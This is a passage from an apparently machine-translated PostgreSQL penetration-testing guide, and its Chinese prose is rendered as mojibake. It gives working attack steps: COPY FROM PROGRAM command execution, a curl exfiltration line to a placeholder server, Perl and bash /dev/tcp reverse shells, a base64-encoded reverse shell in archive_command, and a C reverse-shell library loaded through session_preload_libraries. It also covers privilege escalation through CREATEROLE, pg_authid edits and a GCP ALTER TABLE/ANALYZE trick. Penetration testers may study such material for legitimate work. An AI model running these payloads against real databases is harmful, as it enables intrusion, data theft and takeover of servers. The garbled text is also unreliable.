<p>**æ³¨æ„ï¼š**å¦‚æœæ‚¨æ— æ³•ä»è®¾ç½®ä¸­æ£€ç´¢å½“å‰æ•°æ®ç›®å½•è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡<code>SELECT version()</code>æŸ¥è¯¢è·å–ä¸»è¦PostgreSQLç‰ˆæœ¬ï¼Œå¹¶å°è¯•æš´åŠ›ç ´è§£è·¯å¾„ã€‚Unixå®‰è£…çš„PostgreSQLå¸¸è§æ•°æ®ç›®å½•è·¯å¾„ä¸º<code>/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/</code>ã€‚å¸¸è§çš„é›†ç¾¤åç§°æ˜¯<code>main</code>ã€‚
2.  è·å–ä¸ç›®æ ‡è¡¨å…³è”çš„æ–‡ä»¶èŠ‚ç‚¹çš„ç›¸å¯¹è·¯å¾„</p>
<pre><code class="language-sql">SELECT pg_relation_filepath('{TABLE_NAME}')
</code></pre>
<p>æ­¤æŸ¥è¯¢åº”è¿”å›ç±»ä¼¼<code>base/3/1337</code>çš„å†…å®¹ã€‚ç£ç›˜ä¸Šçš„å®Œæ•´è·¯å¾„å°†æ˜¯<code>$DATA_DIRECTORY/base/3/1337</code>ï¼Œå³<code>/var/lib/postgresql/13/main/base/3/1337</code>ã€‚
3.  é€šè¿‡<code>lo_*</code>å‡½æ•°ä¸‹è½½æ–‡ä»¶èŠ‚ç‚¹</p>
<pre><code class="language-sql">SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
</code></pre>
<ol start="4">
<li>è·å–ä¸ç›®æ ‡è¡¨å…³è”çš„æ•°æ®ç±»å‹</li>
</ol>
<pre><code class="language-sql">SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
</code></pre>
<ol start="5">
<li>ä½¿ç”¨<a href="https://github.com/adeadfed/postgresql-filenode-editor">PostgreSQLæ–‡ä»¶èŠ‚ç‚¹ç¼–è¾‘å™¨</a>æ¥<a href="https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users">ç¼–è¾‘æ–‡ä»¶èŠ‚ç‚¹</a>ï¼›å°†æ‰€æœ‰<code>rol*</code>å¸ƒå°”æ ‡å¿—è®¾ç½®ä¸º1ä»¥è·å¾—å®Œå…¨æƒé™ã€‚</li>
</ol>
<pre><code class="language-bash">python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
</code></pre>
<p><img src="https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif" alt="PostgreSQLæ–‡ä»¶èŠ‚ç‚¹ç¼–è¾‘å™¨æ¼”ç¤º" />
6.  é€šè¿‡<code>lo_*</code>å‡½æ•°é‡æ–°ä¸Šä¼ ç¼–è¾‘åçš„æ–‡ä»¶èŠ‚ç‚¹ï¼Œå¹¶è¦†ç›–ç£ç›˜ä¸Šçš„åŸå§‹æ–‡ä»¶</p>
<pre><code class="language-sql">SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
</code></pre>
<ol start="7">
<li><em>(å¯é€‰)</em> é€šè¿‡è¿è¡Œä¸€ä¸ªæ˜‚è´µçš„SQLæŸ¥è¯¢æ¥æ¸…é™¤å†…å­˜ä¸­çš„è¡¨ç¼“å­˜</li>
</ol>
<pre><code class="language-sql">SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
</code></pre>
<ol start="8">
<li>ç°åœ¨æ‚¨åº”è¯¥åœ¨PostgreSQLä¸­çœ‹åˆ°æ›´æ–°çš„è¡¨å€¼ã€‚</li>
</ol>
<p>æ‚¨è¿˜å¯ä»¥é€šè¿‡ç¼–è¾‘<code>pg_authid</code>è¡¨æˆä¸ºè¶…çº§ç®¡ç†å‘˜ã€‚<strong>è¯·å‚è§</strong> <a href="pentesting-postgresql.html#privesc-by-overwriting-internal-postgresql-tables"><strong>ä»¥ä¸‹éƒ¨åˆ†</strong></a>ã€‚</p>
<h2 id="rce"><a class="header" href="#rce">RCE</a></h2>
<h3 id="rceåˆ°ç¨‹åº"><a class="header" href="#rceåˆ°ç¨‹åº"><strong>RCEåˆ°ç¨‹åº</strong></a></h3>
<p>è‡ª<a href="https://www.postgresql.org/docs/9.3/release-9-3.html">ç‰ˆæœ¬9.3</a>ä»¥æ¥ï¼Œåªæœ‰<strong>è¶…çº§ç”¨æˆ·</strong>å’Œ**<code>pg_execute_server_program</code>**ç»„çš„æˆå‘˜å¯ä»¥ä½¿ç”¨copyè¿›è¡ŒRCEï¼ˆå¸¦æœ‰å¤–æ³„çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-sql">'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
</code></pre>
<p>ç¤ºä¾‹æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;''';
</code></pre>
<p>{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰ <strong><code>CREATEROLE</code></strong> æƒé™ï¼Œæ‚¨å¯ä»¥ <strong>ä½¿è‡ªå·±æˆä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š</strong></p>
<pre><code class="language-sql">GRANT pg_execute_server_program TO username;
</code></pre>
<p><a href="pentesting-postgresql.html#privilege-escalation-with-createrole"><strong>æ›´å¤šä¿¡æ¯ã€‚</strong></a>
{% endhint %}</p>
<p>æˆ–è€…ä½¿ç”¨ <strong>metasploit</strong> çš„ <code>multi/postgres/postgres_copy_from_program_cmd_exec</code> æ¨¡å—ã€‚<br />
å…³äºæ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯ <a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5"><strong>åœ¨è¿™é‡Œ</strong></a>ã€‚è™½ç„¶è¢«æŠ¥å‘Šä¸º CVE-2019-9193ï¼ŒPostges å®£ç§°è¿™æ˜¯ä¸€ä¸ª <a href="https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/">ç‰¹æ€§å¹¶ä¸”ä¸ä¼šè¢«ä¿®å¤</a>ã€‚</p>
<h3 id="ä½¿ç”¨-postgresql-è¯­è¨€çš„-rce"><a class="header" href="#ä½¿ç”¨-postgresql-è¯­è¨€çš„-rce">ä½¿ç”¨ PostgreSQL è¯­è¨€çš„ RCE</a></h3>
<p>{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
<a href="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.html">rce-with-postgresql-languages.md</a>
{% endcontent-ref %}</p>
<h3 id="ä½¿ç”¨-postgresql-æ‰©å±•çš„-rce"><a class="header" href="#ä½¿ç”¨-postgresql-æ‰©å±•çš„-rce">ä½¿ç”¨ PostgreSQL æ‰©å±•çš„ RCE</a></h3>
<p>ä¸€æ—¦ä½  <strong>å­¦ä¹ </strong> äº†ä¹‹å‰çš„å¸–å­ <strong>å¦‚ä½•ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡ <strong>ä¸Šä¼  PostgreSQL æ‰©å±•å¹¶åŠ è½½å®ƒ</strong> æ¥è·å¾— <strong>RCE</strong>ã€‚</p>
<p>{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
<a href="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html">rce-with-postgresql-extensions.md</a>
{% endcontent-ref %}</p>
<h3 id="postgresql-é…ç½®æ–‡ä»¶-rce"><a class="header" href="#postgresql-é…ç½®æ–‡ä»¶-rce">PostgreSQL é…ç½®æ–‡ä»¶ RCE</a></h3>
<p>{% hint style="info" %}
ä»¥ä¸‹ RCE å‘é‡åœ¨å—é™ SQLi ä¸Šä¸‹æ–‡ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºæ‰€æœ‰æ­¥éª¤éƒ½å¯ä»¥é€šè¿‡åµŒå¥—çš„ SELECT è¯­å¥æ‰§è¡Œ
{% endhint %}</p>
<p>PostgreSQL çš„ <strong>é…ç½®æ–‡ä»¶</strong> æ˜¯ <strong>å¯å†™çš„</strong>ï¼Œç”± <strong>postgres ç”¨æˆ·</strong> æ‹¥æœ‰ï¼Œè¯¥ç”¨æˆ·è¿è¡Œæ•°æ®åº“ï¼Œå› æ­¤ä½œä¸º <strong>è¶…çº§ç”¨æˆ·</strong>ï¼Œä½ å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å†™å…¥æ–‡ä»¶ï¼Œå› æ­¤ä½ å¯ä»¥ <strong>è¦†ç›–æ­¤æ–‡ä»¶ã€‚</strong></p>
<p><img src="../.gitbook/assets/image%20(322).png" alt="" /></p>
<h4 id="ä½¿ç”¨-ssl_passphrase_command-çš„-rce"><a class="header" href="#ä½¿ç”¨-ssl_passphrase_command-çš„-rce"><strong>ä½¿ç”¨ ssl_passphrase_command çš„ RCE</strong></a></h4>
<p>å…³äºæ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ <a href="https://pulsesecurity.co.nz/articles/postgres-sqli">åœ¨è¿™é‡Œ</a>ã€‚</p>
<p>é…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€äº›æœ‰è¶£çš„å±æ€§å¯ä»¥å¯¼è‡´ RCEï¼š</p>
<ul>
<li><code>ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'</code> æ•°æ®åº“ç§é’¥çš„è·¯å¾„</li>
<li><code>ssl_passphrase_command = ''</code> å¦‚æœç§é’¥æ–‡ä»¶å—åˆ°å¯†ç ä¿æŠ¤ï¼ˆåŠ å¯†ï¼‰ï¼ŒPostgreSQL å°† <strong>æ‰§è¡Œæ­¤å±æ€§ä¸­æŒ‡ç¤ºçš„å‘½ä»¤</strong>ã€‚</li>
<li><code>ssl_passphrase_command_supports_reload = off</code> <strong>å¦‚æœ</strong> æ­¤å±æ€§ä¸º <strong>on</strong>ï¼Œå½“å¯†é’¥å—åˆ°å¯†ç ä¿æŠ¤æ—¶ <strong>æ‰§è¡Œçš„å‘½ä»¤</strong> <strong>å°†åœ¨ <code>pg_reload_conf()</code> è¢«æ‰§è¡Œæ—¶æ‰§è¡Œ</strong>ã€‚</li>
</ul>
<p>ç„¶åï¼Œæ”»å‡»è€…éœ€è¦ï¼š</p>
<ol>
<li><strong>ä»æœåŠ¡å™¨è½¬å‚¨ç§é’¥</strong></li>
<li><strong>åŠ å¯†</strong> ä¸‹è½½çš„ç§é’¥ï¼š
<ol>
<li><code>rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key</code></li>
</ol>
</li>
<li><strong>è¦†ç›–</strong></li>
<li><strong>è½¬å‚¨</strong> å½“å‰çš„ PostgreSQL <strong>é…ç½®</strong></li>
<li><strong>ç”¨æåˆ°çš„å±æ€§é…ç½®è¦†ç›–</strong> <strong>é…ç½®</strong>ï¼š
<ol>
<li><code>ssl_passphrase_command = 'bash -c "bash -i &gt;&amp; /dev/tcp/127.0.0.1/8111 0&gt;&amp;1"'</code></li>
<li><code>ssl_passphrase_command_supports_reload = on</code></li>
</ol>
</li>
<li>æ‰§è¡Œ <code>pg_reload_conf()</code></li>
</ol>
<p>åœ¨æµ‹è¯•æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°è¿™ä»…åœ¨ <strong>ç§é’¥æ–‡ä»¶æƒé™ä¸º 640</strong> æ—¶æœ‰æ•ˆï¼Œä¸” <strong>ç”± root æ‹¥æœ‰</strong>ï¼Œå¹¶ä¸” <strong>å±äº ssl-cert æˆ– postgres ç»„</strong>ï¼ˆä»¥ä¾¿ postgres ç”¨æˆ·å¯ä»¥è¯»å–ï¼‰ï¼Œå¹¶æ”¾ç½®åœ¨ <em>/var/lib/postgresql/12/main</em> ä¸­ã€‚</p>
<h4 id="ä½¿ç”¨-archive_command-çš„-rce"><a class="header" href="#ä½¿ç”¨-archive_command-çš„-rce"><strong>ä½¿ç”¨ archive_command çš„ RCE</strong></a></h4>
<p><strong>æ›´å¤š</strong> <a href="https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3"><strong>å…³äºæ­¤é…ç½®å’Œ WAL çš„ä¿¡æ¯åœ¨è¿™é‡Œ</strong></a><strong>ã€‚</strong></p>
<p>é…ç½®æ–‡ä»¶ä¸­å¦ä¸€ä¸ªå¯åˆ©ç”¨çš„å±æ€§æ˜¯ <code>archive_command</code>ã€‚</p>
<p>ä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œ<code>archive_mode</code> è®¾ç½®å¿…é¡»ä¸º <code>'on'</code> æˆ– <code>'always'</code>ã€‚å¦‚æœä¸ºçœŸï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¦†ç›– <code>archive_command</code> ä¸­çš„å‘½ä»¤ï¼Œå¹¶é€šè¿‡ WALï¼ˆé¢„å†™æ—¥å¿—ï¼‰æ“ä½œå¼ºåˆ¶æ‰§è¡Œå®ƒã€‚</p>
<p>ä¸€èˆ¬æ­¥éª¤æ˜¯ï¼š</p>
<ol>
<li>æ£€æŸ¥å½’æ¡£æ¨¡å¼æ˜¯å¦å¯ç”¨ï¼š<code>SELECT current_setting('archive_mode')</code></li>
<li>ç”¨æœ‰æ•ˆè´Ÿè½½è¦†ç›– <code>archive_command</code>ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåå‘ shellï¼š<code>archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'</code></li>
<li>é‡æ–°åŠ è½½é…ç½®ï¼š<code>SELECT pg_reload_conf()</code></li>
<li>å¼ºåˆ¶ WAL æ“ä½œè¿è¡Œï¼Œè¿™å°†è°ƒç”¨å½’æ¡£å‘½ä»¤ï¼š<code>SELECT pg_switch_wal()</code> æˆ– <code>SELECT pg_switch_xlog()</code> å¯¹äºæŸäº› PostgreSQL ç‰ˆæœ¬</li>
</ol>
<h4 id="ä½¿ç”¨é¢„åŠ è½½åº“çš„-rce"><a class="header" href="#ä½¿ç”¨é¢„åŠ è½½åº“çš„-rce"><strong>ä½¿ç”¨é¢„åŠ è½½åº“çš„ RCE</strong></a></h4>
<p>å…³äºæ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ <a href="https://adeadfed.com/posts/postgresql-select-only-rce/">åœ¨è¿™é‡Œ</a>ã€‚</p>
<p>æ­¤æ”»å‡»å‘é‡åˆ©ç”¨ä»¥ä¸‹é…ç½®å˜é‡ï¼š</p>
<ul>
<li><code>session_preload_libraries</code> -- PostgreSQL æœåŠ¡å™¨åœ¨å®¢æˆ·ç«¯è¿æ¥æ—¶å°†åŠ è½½çš„åº“ã€‚</li>
<li><code>dynamic_library_path</code> -- PostgreSQL æœåŠ¡å™¨å°†æœç´¢åº“çš„ç›®å½•åˆ—è¡¨ã€‚</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥å°† <code>dynamic_library_path</code> å€¼è®¾ç½®ä¸ºä¸€ä¸ªç”±è¿è¡Œæ•°æ®åº“çš„ <code>postgres</code> ç”¨æˆ·å¯å†™çš„ç›®å½•ï¼Œä¾‹å¦‚ <code>/tmp/</code> ç›®å½•ï¼Œå¹¶åœ¨å…¶ä¸­ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„ <code>.so</code> å¯¹è±¡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†é€šè¿‡å°†å…¶åŒ…å«åœ¨ <code>session_preload_libraries</code> å˜é‡ä¸­ï¼Œå¼ºåˆ¶ PostgreSQL æœåŠ¡å™¨åŠ è½½æˆ‘ä»¬æ–°ä¸Šä¼ çš„åº“ã€‚</p>
<p>æ”»å‡»æ­¥éª¤æ˜¯ï¼š</p>
<ol>
<li>ä¸‹è½½åŸå§‹ <code>postgresql.conf</code></li>
<li>åœ¨ <code>dynamic_library_path</code> å€¼ä¸­åŒ…å« <code>/tmp/</code> ç›®å½•ï¼Œä¾‹å¦‚ <code>dynamic_library_path = '/tmp:$libdir'</code></li>
<li>åœ¨ <code>session_preload_libraries</code> å€¼ä¸­åŒ…å«æ¶æ„åº“åç§°ï¼Œä¾‹å¦‚ <code>session_preload_libraries = 'payload.so'</code></li>
<li>é€šè¿‡ <code>SELECT version()</code> æŸ¥è¯¢æ£€æŸ¥ä¸»è¦ PostgreSQL ç‰ˆæœ¬</li>
<li>ä½¿ç”¨æ­£ç¡®çš„ PostgreSQL å¼€å‘åŒ…ç¼–è¯‘æ¶æ„åº“ä»£ç  ç¤ºä¾‹ä»£ç ï¼š</li>
</ol>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &amp;revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
</code></pre>
<p>ç¼–è¯‘ä»£ç ï¼š</p>
<pre><code class="language-bash">gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
</code></pre>
<ol start="6">
<li>ä¸Šä¼ åœ¨æ­¥éª¤ 2-3 ä¸­åˆ›å»ºçš„æ¶æ„ <code>postgresql.conf</code>ï¼Œå¹¶è¦†ç›–åŸå§‹æ–‡ä»¶</li>
<li>å°†æ­¥éª¤ 5 ä¸­çš„ <code>payload.so</code> ä¸Šä¼ åˆ° <code>/tmp</code> ç›®å½•</li>
<li>é€šè¿‡é‡å¯æœåŠ¡å™¨æˆ–è°ƒç”¨ <code>SELECT pg_reload_conf()</code> æŸ¥è¯¢é‡æ–°åŠ è½½æœåŠ¡å™¨é…ç½®</li>
<li>åœ¨ä¸‹ä¸€ä¸ªæ•°æ®åº“è¿æ¥æ—¶ï¼Œä½ å°†æ”¶åˆ°åå‘ shell è¿æ¥ã€‚</li>
</ol>
<h2 id="postgres-æƒé™æå‡"><a class="header" href="#postgres-æƒé™æå‡"><strong>Postgres æƒé™æå‡</strong></a></h2>
<h3 id="createrole-æƒé™æå‡"><a class="header" href="#createrole-æƒé™æå‡">CREATEROLE æƒé™æå‡</a></h3>
<h4 id="æˆäºˆ"><a class="header" href="#æˆäºˆ"><strong>æˆäºˆ</strong></a></h4>
<p>æ ¹æ® <a href="https://www.postgresql.org/docs/13/sql-grant.html"><strong>æ–‡æ¡£</strong></a>ï¼š<em>å…·æœ‰ <strong><code>CREATEROLE</code></strong> æƒé™çš„è§’è‰²å¯ä»¥ <strong>æˆäºˆæˆ–æ’¤é”€å¯¹ä»»ä½•éè¶…çº§ç”¨æˆ·è§’è‰²çš„æˆå‘˜èµ„æ ¼</strong>ã€‚</em></p>
<p>å› æ­¤ï¼Œå¦‚æœä½ æ‹¥æœ‰ <strong><code>CREATEROLE</code></strong> æƒé™ï¼Œä½ å¯ä»¥æˆäºˆè‡ªå·±å¯¹å…¶ä»– <strong>è§’è‰²</strong>ï¼ˆä¸æ˜¯è¶…çº§ç”¨æˆ·ï¼‰çš„è®¿é—®æƒé™ï¼Œè¿™å¯ä»¥è®©ä½ æœ‰æœºä¼šè¯»å–å’Œå†™å…¥æ–‡ä»¶å¹¶æ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre><code class="language-sql"># Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
</code></pre>
<h4 id="ä¿®æ”¹å¯†ç "><a class="header" href="#ä¿®æ”¹å¯†ç ">ä¿®æ”¹å¯†ç </a></h4>
<p>å…·æœ‰æ­¤è§’è‰²çš„ç”¨æˆ·è¿˜å¯ä»¥<strong>æ›´æ”¹</strong>å…¶ä»–<strong>éè¶…çº§ç”¨æˆ·</strong>çš„<strong>å¯†ç </strong>ï¼š</p>
<pre><code class="language-sql">#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
</code></pre>
<h4 id="privesc-to-superuser"><a class="header" href="#privesc-to-superuser">Privesc to SUPERUSER</a></h4>
<p>å¾ˆå¸¸è§çš„æ˜¯å‘ç°<strong>æœ¬åœ°ç”¨æˆ·å¯ä»¥åœ¨PostgreSQLä¸­ç™»å½•è€Œæ— éœ€æä¾›ä»»ä½•å¯†ç </strong>ã€‚å› æ­¤ï¼Œä¸€æ—¦æ‚¨è·å¾—äº†<strong>æ‰§è¡Œä»£ç çš„æƒé™</strong>ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥æˆäºˆæ‚¨**<code>SUPERUSER</code>**è§’è‰²ï¼š</p>
<pre><code class="language-sql">COPY (select '') to PROGRAM 'psql -U &lt;super_user&gt; -c "ALTER USER &lt;your_username&gt; WITH SUPERUSER;"';
</code></pre>
<p>{% hint style="info" %}
è¿™é€šå¸¸æ˜¯å› ä¸º <strong><code>pg_hba.conf</code></strong> æ–‡ä»¶ä¸­çš„ä»¥ä¸‹è¡Œï¼š</p>
<pre><code class="language-bash"># "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
</code></pre>
<p>{% endhint %}</p>
<h3 id="alter-table-privesc"><a class="header" href="#alter-table-privesc"><strong>ALTER TABLE privesc</strong></a></h3>
<p>åœ¨<a href="https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities"><strong>è¿™ç¯‡æ–‡ç« </strong></a>ä¸­è§£é‡Šäº†å¦‚ä½•åœ¨Postgres GCPä¸­åˆ©ç”¨æˆäºˆç”¨æˆ·çš„ALTER TABLEæƒé™å®ç°<strong>privesc</strong>ã€‚</p>
<p>å½“ä½ å°è¯•<strong>å°†å¦ä¸€ä¸ªç”¨æˆ·è®¾ä¸ºè¡¨çš„æ‰€æœ‰è€…</strong>æ—¶ï¼Œåº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª<strong>é”™è¯¯</strong>æ¥é˜»æ­¢å®ƒï¼Œä½†æ˜¾ç„¶GCPç»™äº†<strong>éè¶…çº§ç”¨æˆ·postgresç”¨æˆ·</strong>è¿™ä¸ª<strong>é€‰é¡¹</strong>ï¼š</p>
<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
<p>å°†è¿™ä¸ªæƒ³æ³•ä¸å½“åœ¨<strong>å¸¦æœ‰ç´¢å¼•å‡½æ•°çš„è¡¨</strong>ä¸Šæ‰§è¡Œ<strong>INSERT/UPDATE/</strong><a href="https://www.postgresql.org/docs/13/sql-analyze.html"><strong>ANALYZE</strong></a>å‘½ä»¤æ—¶ï¼Œ<strong>å‡½æ•°</strong>ä¼šä»¥<strong>è¡¨****æ‰€æœ‰è€…çš„æƒé™</strong>ä½œä¸ºå‘½ä»¤çš„ä¸€éƒ¨åˆ†è¢«<strong>è°ƒç”¨</strong>çš„äº‹å®ç»“åˆèµ·æ¥ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å‡½æ•°çš„ç´¢å¼•ï¼Œå¹¶å°†è¯¥è¡¨çš„æ‰€æœ‰è€…æƒé™æˆäºˆ<strong>è¶…çº§ç”¨æˆ·</strong>ï¼Œç„¶ååœ¨å¸¦æœ‰æ¶æ„å‡½æ•°çš„è¡¨ä¸Šè¿è¡ŒANALYZEï¼Œè¯¥å‡½æ•°å°†èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºå®ƒä½¿ç”¨çš„æ˜¯æ‰€æœ‰è€…çš„æƒé™ã€‚</p>
<pre><code class="language-c">GetUserIdAndSecContext(&amp;save_userid, &amp;save_sec_context);
SetUserIdAndSecContext(onerel-&gt;rd_rel-&gt;relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
</code></pre>
<h4 id="åˆ©ç”¨"><a class="header" href="#åˆ©ç”¨">åˆ©ç”¨</a></h4>
<ol>
<li>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°è¡¨ã€‚</li>
<li>å‘è¡¨ä¸­æ’å…¥ä¸€äº›æ— å…³å†…å®¹ï¼Œä»¥æä¾›ç´¢å¼•å‡½æ•°çš„æ•°æ®ã€‚</li>
<li>å¼€å‘ä¸€ä¸ªåŒ…å«ä»£ç æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½çš„æ¶æ„ç´¢å¼•å‡½æ•°ï¼Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„å‘½ä»¤ã€‚</li>
<li>å°†è¡¨çš„æ‰€æœ‰è€…æ›´æ”¹ä¸ºâ€œcloudsqladminâ€ï¼Œè¿™æ˜¯GCPçš„è¶…çº§ç”¨æˆ·è§’è‰²ï¼Œä»…ç”¨äºCloud SQLç®¡ç†å’Œç»´æŠ¤æ•°æ®åº“ã€‚</li>
<li>å¯¹è¡¨æ‰§è¡ŒANALYZEæ“ä½œã€‚æ­¤æ“ä½œè¿«ä½¿PostgreSQLå¼•æ“åˆ‡æ¢åˆ°è¡¨æ‰€æœ‰è€…â€œcloudsqladminâ€çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å› æ­¤ï¼Œæ¶æ„ç´¢å¼•å‡½æ•°ä»¥â€œcloudsqladminâ€çš„æƒé™è¢«è°ƒç”¨ï¼Œä»è€Œä½¿ä¹‹å‰æœªç»æˆæƒçš„shellå‘½ä»¤å¾—ä»¥æ‰§è¡Œã€‚</li>
</ol>
<p>åœ¨PostgreSQLä¸­ï¼Œè¿™ä¸ªæµç¨‹çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p>
<pre><code class="language-sql">CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
</code></pre>
<p>ç„¶åï¼Œ<code>shell_commands_results</code> è¡¨å°†åŒ…å«æ‰§è¡Œä»£ç çš„è¾“å‡ºï¼š</p>
<pre><code>uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
</code></pre>
<h3 id="æœ¬åœ°ç™»å½•"><a class="header" href="#æœ¬åœ°ç™»å½•">æœ¬åœ°ç™»å½•</a></h3>
<p>ä¸€äº›é…ç½®é”™è¯¯çš„ postgresql å®ä¾‹å¯èƒ½å…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ç™»å½•ï¼Œå¯ä»¥ä½¿ç”¨ <strong><code>dblink</code> function</strong> ä» 127.0.0.1 æœ¬åœ°ç™»å½•ï¼š</p>
<pre><code class="language-sql">\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
</code></pre>
<p>{% hint style="warning" %}
